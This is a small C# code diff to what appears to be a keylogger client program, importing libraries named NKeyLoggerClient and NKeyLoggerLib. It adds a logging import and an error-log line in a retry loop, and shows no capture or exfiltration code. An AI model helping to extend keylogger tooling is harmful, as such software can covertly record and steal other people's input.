@@ -1,4 +1,5 @@
-﻿using NKeyLoggerClient;
+﻿using Microsoft.Extensions.Logging;
+using NKeyLoggerClient;
 using NKeyLoggerLib;
 class Program
 {
@@ -15,6 +16,7 @@ class Program
         }
         catch (Exception ex)
         {
+            Log<Program>.Instance.logger?.LogError($"Error: {ex.Message}");
             goto again;
         }
     }
